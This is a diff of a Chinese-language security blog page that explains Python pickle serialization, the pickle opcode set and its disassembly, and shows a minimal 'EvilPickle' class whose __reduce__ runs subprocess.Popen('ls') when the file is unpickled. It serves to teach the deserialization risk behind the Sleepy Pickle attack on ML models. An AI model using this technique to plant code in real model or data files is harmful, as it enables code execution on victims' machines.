@@ -8,7 +8,7 @@
       
       
       
-        <link rel="canonical" href="http://yunshiuan.com/CyberSecurity/Blogs/SleeplyPickle/">
+        <link rel="canonical" href="http://yunshiuan.com/CyberSecurity/Blogs/SleepyPickle/">
       
       
       
@@ -18,7 +18,7 @@
     
     
       
-        <title>Sleeply Pickle - yunshiaun.docs</title>
+        <title>💤🥒Sleeply Pickle - yunshiaun.docs</title>
       
     
     
@@ -104,7 +104,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Sleeply Pickle
+              💤🥒Sleeply Pickle
             
           </span>
         </div>
@@ -1392,27 +1392,54 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#pickle" class="md-nav__link">
+  <a href="#serializationdeserialization" class="md-nav__link">
     <span class="md-ellipsis">
-      Pickle 簡介
+      ♻️序列化(Serialization)/反序列化(Deserialization)
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#sleeply-pickle_1" class="md-nav__link">
+  <a href="#what-is-pickle" class="md-nav__link">
     <span class="md-ellipsis">
-      Sleeply Pickle 攻擊簡介
+      🥒 What is Pickle?
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
+  <a href="#whats-wrong-with-pickle" class="md-nav__link">
     <span class="md-ellipsis">
+      ⚠️What's Wrong with Pickle ?
+    </span>
+  </a>
+  
+</li>
       
+        <li class="md-nav__item">
+  <a href="#sleepy-pickle" class="md-nav__link">
+    <span class="md-ellipsis">
+      Sleepy Pickle
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#demo" class="md-nav__link">
+    <span class="md-ellipsis">
+      Demo
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#strict-pickle" class="md-nav__link">
+    <span class="md-ellipsis">
+      Strict Pickle
     </span>
   </a>
   
@@ -1443,14 +1470,330 @@
 
 
 
-<h1 id="sleeply-pickle">Sleeply Pickle</h1>
-<p>github : https://github.com/YunshiuanOAO/SleppyPickle-Poc</p>
-<h2 id="pickle">Pickle 簡介</h2>
-<h2 id="sleeply-pickle_1">Sleeply Pickle 攻擊簡介</h2>
-<h2 id="_1"></h2>
+<h1 id="sleeply-pickle">💤🥒Sleeply Pickle</h1>
+<p>Demo code : https://github.com/YunshiuanOAO/SleppyPickle-Poc</p>
+<h2 id="serializationdeserialization">♻️序列化(Serialization)/反序列化(Deserialization)</h2>
+<p>序列化是將一個資料結構或物件轉換成一種可以儲存或交換的格式（如位元組流、JSON、XML 等）。這樣的轉換讓物件能夠寫入檔案、透過網路傳輸，或儲存在資料庫中。</p>
+<p>反序列化則是將儲存的數據或接收到的數據轉換回原始的物件或資料結構。</p>
+<p><img alt="alt text" src="../SleepyPicklePic/picklePic.png" /></p>
+<hr />
+<h2 id="what-is-pickle">🥒 What is Pickle?</h2>
+<p>Pickle 是 Python 的內建模組，提供了將 Python 物件序列化和反序列化的功能。</p>
+<dl>
+<dt>🔹 常見用途</dt>
+<dd>
+<p>將物件儲存到檔案中，方便之後載入。</p>
+</dd>
+<dd>
+<p>將物件透過網路或其他通道進行傳輸。</p>
+</dd>
+<dd>
+<p><strong>快速儲存和載入機器學習模型、配置檔或計算結果</strong>。</p>
+</dd>
+<dt>🔸 支援的物件類型</dt>
+<dd>
+<p>Pickle 支援多種 Python 內建的資料型態，包括：</p>
+</dd>
+<dd>
+<p>✔️ 數字（int, float）</p>
+</dd>
+<dd>
+<p>✔️ 字串（str）</p>
+</dd>
+<dd>
+<p>✔️ 列表（list）、元組（tuple）、字典（dict）、集合（set）</p>
+</dd>
+<dd>
+<p>✔️ 自訂類別物件</p>
+</dd>
+<dd>
+<p>✔️ 函數（有些限制）</p>
+</dd>
+</dl>
+<p>Example : </p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">pickle</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">pickletools</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="s2">&quot;Alice&quot;</span><span class="p">,</span> <span class="s2">&quot;age&quot;</span><span class="p">:</span> <span class="mi">30</span><span class="p">,</span> <span class="s2">&quot;scores&quot;</span><span class="p">:</span> <span class="p">[</span><span class="mi">88</span><span class="p">,</span> <span class="mi">92</span><span class="p">,</span> <span class="mi">95</span><span class="p">]}</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;data.pkl&quot;</span><span class="p">,</span> <span class="s2">&quot;wb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>    <span class="n">pickle</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">file</span><span class="p">,</span> <span class="n">protocol</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Data has been successfully serialized to data.pkl&quot;</span><span class="p">)</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;data.pkl&quot;</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>    <span class="c1">#loaded_data = pickle.load(file)</span>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>    <span class="n">pickletools</span><span class="o">.</span><span class="n">dis</span><span class="p">(</span><span class="n">file</span><span class="p">,)</span>
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>    <span class="c1">#print(&quot;Data loaded from data.pkl:&quot;, loaded_data)</span>
+</span></code></pre></div>
+<p>Output: </p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>Data has been successfully serialized to data.pkl
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>Data loaded from data.pkl: {&#39;name&#39;: &#39;Alice&#39;, &#39;age&#39;: 30, &#39;scores&#39;: [88, 92, 95]}
+</span></code></pre></div>
+<p>可以使用pickletools將pickle執行的內容dump出來</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>    0: (    MARK
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>    1: d        DICT       (MARK at 0)
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>    2: p    PUT        0
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>    5: V    UNICODE    &#39;name&#39;
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>   11: p    PUT        1
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>   14: V    UNICODE    &#39;Alice&#39;
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>   21: p    PUT        2
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>   24: s    SETITEM
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>   25: V    UNICODE    &#39;age&#39;
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>   30: p    PUT        3
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>   33: I    INT        30
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>   37: s    SETITEM
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>   38: V    UNICODE    &#39;scores&#39;
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>   46: p    PUT        4
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a>   49: (    MARK
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a>   50: l        LIST       (MARK at 49)
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a>   51: p    PUT        5
+</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a>   54: I    INT        88
+</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a>   58: a    APPEND
+</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a>   59: I    INT        92
+</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a>   63: a    APPEND
+</span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a>   64: I    INT        95
+</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a>   68: a    APPEND
+</span><span id="__span-2-24"><a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a>   69: s    SETITEM
+</span><span id="__span-2-25"><a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a>   70: .    STOP
+</span><span id="__span-2-26"><a id="__codelineno-2-26" name="__codelineno-2-26" href="#__codelineno-2-26"></a>highest protocol among opcodes = 0
+</span></code></pre></div>
+<p>由上面的資訊可以得知，其實Pickle在反序列化的過成就很像一個簡易的堆疊虛擬機在執行，透過Opcode並且在Pickle Virtual Machine執行
+主要由這三個</p>
+<ul>
+<li>
+<p>指令處理器 (Instruction Processor)</p>
+<p>從指令流 (byte stream) 中讀取 opcode 與參數，並依序進行解譯與處理。</p>
+<p>不斷重複「讀取 -&gt; 處理」的流程，直到遇到結束符號（通常是 .）後停止。</p>
+<p>反序列化結束時，最終留在 stack 頂端的值將作為反序列化結果返回。</p>
+</li>
+<li>
+<p>Stack (堆疊)</p>
+<p>由 Python 的 list 實作。</p>
+<p>用於暫時儲存資料、參數以及各種物件。</p>
+<p>各種 opcode 會操作此堆疊（如推入、彈出、組合容器等）。</p>
+</li>
+<li>
+<p>Memo (備忘錄)</p>
+<p>由 Python 的 dict 實作。</p>
+<p>在 PVM 整個生命週期中，負責儲存先前出現過的物件，以便重複引用或避免重複建立。</p>
+<p>透過索引或序號 (index) 來存取對應物件。</p>
+</li>
+</ul>
+<p>以下為常用的opcode </p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;"><strong>指令</strong></th>
+<th style="text-align: left;"><strong>描述</strong></th>
+<th style="text-align: left;"><strong>具體寫法</strong></th>
+<th style="text-align: left;"><strong>對 stack 的變化</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;"><strong>c</strong></td>
+<td style="text-align: left;">取得一個全局物件或 import 一個模組</td>
+<td style="text-align: left;"><code>c[module]\n[instance]\n</code></td>
+<td style="text-align: left;">取得的物件入 stack</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>o</strong></td>
+<td style="text-align: left;">尋找 stack 中的上一個 MARK，以之間的第一個資料（必須為函數）為 callable，第二個到第 n 個資料為參數，執行該函數（或實例化一個物件）</td>
+<td style="text-align: left;"><code>o</code></td>
+<td style="text-align: left;">這個過程中涉及到的資料都出 stack，函數的返回值（或生成的物件）入 stack</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>i</strong></td>
+<td style="text-align: left;">相當於 c 和 o 的組合，先取得一個全局函數，然後尋找 stack 中的上一個 MARK，並組合之間的資料為元組，再以該元組為參數執行全局函數（或實例化一個物件）</td>
+<td style="text-align: left;"><code>i[module]\n[callable]\n</code></td>
+<td style="text-align: left;">這個過程中涉及到的資料都出 stack，函數返回值（或生成的物件）入 stack</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>N</strong></td>
+<td style="text-align: left;">實例化一個 None</td>
+<td style="text-align: left;"><code>N</code></td>
+<td style="text-align: left;">取得的 None 對象入 stack</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>S</strong></td>
+<td style="text-align: left;">實例化一個字串對象</td>
+<td style="text-align: left;"><code>S'xxx'\n</code><br>也可使用雙引號或 <code>\'</code> 等 Python 字串形式</td>
+<td style="text-align: left;">取得的字串對象入 stack</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>V</strong></td>
+<td style="text-align: left;">實例化一個 Unicode 字串對象</td>
+<td style="text-align: left;"><code>Vxxx\n</code></td>
+<td style="text-align: left;">取得的字串對象入 stack</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>I</strong></td>
+<td style="text-align: left;">實例化一個 int 對象</td>
+<td style="text-align: left;"><code>Ixxx\n</code></td>
+<td style="text-align: left;">取得的整數對象入 stack</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>F</strong></td>
+<td style="text-align: left;">實例化一個 float 對象</td>
+<td style="text-align: left;"><code>Fx.x\n</code></td>
+<td style="text-align: left;">取得的浮點數對象入 stack</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>R</strong></td>
+<td style="text-align: left;">選擇 stack 上的第一個對象作為函數、第二個對象作為參數（第二個對象必須為元組），然後呼叫該函數</td>
+<td style="text-align: left;"><code>R</code></td>
+<td style="text-align: left;">函數和參數出 stack，函數的返回值入 stack</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>.</strong></td>
+<td style="text-align: left;">程式結束，stack 頂的單一元素作為 <code>pickle.loads()</code> 的返回值</td>
+<td style="text-align: left;"><code>.</code></td>
+<td style="text-align: left;">無</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>(</strong></td>
+<td style="text-align: left;">向 stack 中壓入一個 MARK 標記</td>
+<td style="text-align: left;"><code>(</code></td>
+<td style="text-align: left;">MARK 標記入 stack</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>t</strong></td>
+<td style="text-align: left;">尋找 stack 中的上一個 MARK，並組合之間的資料為元組</td>
+<td style="text-align: left;"><code>t</code></td>
+<td style="text-align: left;">MARK 標記以及被組合的資料出 stack，生成的元組入 stack</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>)</strong></td>
+<td style="text-align: left;">向 stack 中直接壓入一個空元組</td>
+<td style="text-align: left;"><code>)</code></td>
+<td style="text-align: left;">空元組入 stack</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>l</strong></td>
+<td style="text-align: left;">尋找 stack 中的上一個 MARK，並組合之間的資料為列表</td>
+<td style="text-align: left;"><code>l</code></td>
+<td style="text-align: left;">MARK 標記以及被組合的資料出 stack，生成的列表入 stack</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>]</strong></td>
+<td style="text-align: left;">向 stack 中直接壓入一個空列表</td>
+<td style="text-align: left;"><code>]</code></td>
+<td style="text-align: left;">空列表入 stack</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>d</strong></td>
+<td style="text-align: left;">尋找 stack 中的上一個 MARK，並組合之間的資料為字典（資料必須有偶數個，即呈 key-value 對）</td>
+<td style="text-align: left;"><code>d</code></td>
+<td style="text-align: left;">MARK 標記以及被組合的資料出 stack，生成的字典入 stack</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>}</strong></td>
+<td style="text-align: left;">向 stack 中直接壓入一個空字典</td>
+<td style="text-align: left;"><code>}</code></td>
+<td style="text-align: left;">空字典入 stack</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>p</strong></td>
+<td style="text-align: left;">將 stack 頂對象儲存至 memo_n</td>
+<td style="text-align: left;"><code>pn\n</code></td>
+<td style="text-align: left;">無</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>g</strong></td>
+<td style="text-align: left;">將 memo_n 的對象壓入 stack</td>
+<td style="text-align: left;"><code>gn\n</code></td>
+<td style="text-align: left;">將指定索引的 memo 對象入 stack</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>0</strong></td>
+<td style="text-align: left;">丟棄 stack 頂對象</td>
+<td style="text-align: left;"><code>0</code></td>
+<td style="text-align: left;">stack 頂對象被丟棄</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>b</strong></td>
+<td style="text-align: left;">使用 stack 中的第一個元素（儲存多個屬性名: 屬性值的字典）對第二個元素（對象實例）進行屬性設置</td>
+<td style="text-align: left;"><code>b</code></td>
+<td style="text-align: left;">stack 上第一個元素出 stack；第二個元素（對象）被更新</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>s</strong></td>
+<td style="text-align: left;">將 stack 的第一個和第二個對象作為 key-value 對，添加或更新到 stack 的第三個對象（必須為列表或字典，列表以數字作為 key）</td>
+<td style="text-align: left;"><code>s</code></td>
+<td style="text-align: left;">第一、二個元素出 stack，第三個元素（列表或字典）被更新</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>u</strong></td>
+<td style="text-align: left;">尋找 stack 中的上一個 MARK，組合之間的資料（必須有偶數個，即 key-value 對）並全部添加或更新到該 MARK 之前的一個對象（必須為字典）</td>
+<td style="text-align: left;"><code>u</code></td>
+<td style="text-align: left;">MARK 標記以及被組合的資料出 stack，字典被更新</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>a</strong></td>
+<td style="text-align: left;">將 stack 的第一個元素 append 到第二個元素（列表）中</td>
+<td style="text-align: left;"><code>a</code></td>
+<td style="text-align: left;">stack 頂元素出 stack，第二個元素（列表）被更新</td>
+</tr>
+<tr>
+<td style="text-align: center;"><strong>e</strong></td>
+<td style="text-align: left;">尋找 stack 中的上一個 MARK，組合之間的資料並 extends 到該 MARK 之前的一個元素（必須為列表）</td>
+<td style="text-align: left;"><code>e</code></td>
+<td style="text-align: left;">MARK 標記以及被組合的資料出 stack，列表被更新</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="whats-wrong-with-pickle">⚠️What's Wrong with Pickle ?</h2>
+<p>Pickle文檔上有出現這一個警告
+<img alt="alt text" src="../SleepyPicklePic/image.png" /></p>
+<p>Pickle當中有一個 <code>__reduce__</code> 可以使用，當反序列化時會自動呼叫</p>
+<p>以下範例為製作一個惡意的pickle</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">pickle</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">subprocess</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="k">class</span><span class="w"> </span><span class="nc">EvilPickle</span><span class="p">:</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>        <span class="k">return</span> <span class="p">(</span><span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">,</span> <span class="p">((</span><span class="s1">&#39;ls&#39;</span><span class="p">,),))</span>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="n">e</span> <span class="o">=</span>  <span class="n">EvilPickle</span><span class="p">()</span>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;evil.pkl&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>    <span class="n">pickle</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>    0: c    GLOBAL     &#39;commands Popen&#39;
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>   16: p    PUT        0
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>   19: (    MARK
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>   20: (        MARK
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>   21: V            UNICODE    &#39;ls&#39;
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>   25: p            PUT        1
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>   28: t            TUPLE      (MARK at 20)
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>   29: p        PUT        2
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>   32: t        TUPLE      (MARK at 19)
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>   33: p    PUT        3
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>   36: R    REDUCE
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>   37: p    PUT        4
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>   40: .    STOP
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>highest protocol among opcodes = 0
+</span></code></pre></div>
+<p>執行結果：
+<img alt="alt text" src="../SleepyPicklePic/reduce_RCE.png" /></p>
+<p>即可執行<code>ls</code>指令</p>
+<h2 id="sleepy-pickle">Sleepy Pickle</h2>
+<h2 id="demo">Demo</h2>
+<h2 id="strict-pickle">Strict Pickle</h2>
 <h2 id="reference">Reference</h2>
-<p>https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/
-https://blog.trailofbits.com/2021/03/15/never-a-dill-moment-exploiting-machine-learning-pickle-files/ </p>
+<ul>
+<li><a href="https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/">Exploiting ML models with pickle file attacks: Part 1</a></li>
+<li><a href="https://blog.trailofbits.com/2021/03/15/never-a-dill-moment-exploiting-machine-learning-pickle-files/">Exploiting ML models with pickle file attacks: Part 2</a></li>
+<li>
+<p><a href="https://blog.trailofbits.com/2021/03/15/never-a-dill-moment-exploiting-machine-learning-pickle-files/">Never a dill moment: Exploiting machine learning pickle files</a></p>
+</li>
+<li>
+<p><a href="https://thesisapi.lib.nycu.edu.tw/server/api/core/bitstreams/affc3d4c-9f19-429a-b392-ce8420d7351b/content">Pain Pickle: 繞過 Python 中受限制的 Unpickler 之自動化脅迫生成</a></p>
+</li>
+<li>
+<p><a href="https://www.ithome.com.tw/news/163545">研究人員揭露針對機器學習模型而來的攻擊手法Sleepy Pickle</a></p>
+</li>
+</ul>
 
 
 
